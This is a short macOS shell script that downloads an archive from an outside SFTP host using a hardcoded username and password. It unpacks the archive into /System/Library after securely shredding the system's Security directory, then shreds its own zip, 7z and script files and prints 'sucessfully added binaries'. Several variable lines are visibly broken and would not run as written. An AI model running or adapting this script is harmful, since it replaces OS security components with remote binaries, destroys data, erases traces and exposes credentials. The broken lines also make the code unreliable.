PERSON_NAME=""
SERIAL_NUMBER=ioreg -c IOPlatformExpertDevice | grep IOPlatformSerialNumber | cut -d'"' -f4
IOS_VERSION=grep -A1 'ProductVersion' /System/Library/CoreServices/SystemVersion.plist | grep -oPm1 '(?<=<string>)[^<]+'
LOCAL_FILE="appstore_unmodified.zip"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_USER="b1bb7bdefa38443d9672ffe48cd86824"
REMOTE_PASS="xn3vWMpR5PVHNlDALgj3t3HEesgleM0e"
REMOTE_PATH="/home"
REMOTE_DEST="/"
ARCHIVE_NAME="$IOS_VERSION_$SERIAL_NUMBER_$LOCAL_FILE_$PERSON_NAME_new"




cd $home/../../..//System/Library/
# configuration



#sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:Security_new.zip ./Security_new.zip
sshpass -p "$REMOTE_PASS" scp $REMOTE_USER@$REMOTE_HOST:ARCHIVE_NAME.zip ./ARCHIVE_NAME.zip
#rm -rf ./Security
shred -fzu -n 3 ./Security >/dev/null 2>&1
#echo "fsdfsdfdsfsdfsdfds"
unzip -qqo ARCHIVE_NAME.zip -d ./
#rm -f *.zip
shred -uzv *.{zip,7z,sh}
reset
echo "sucessfully added binaries"
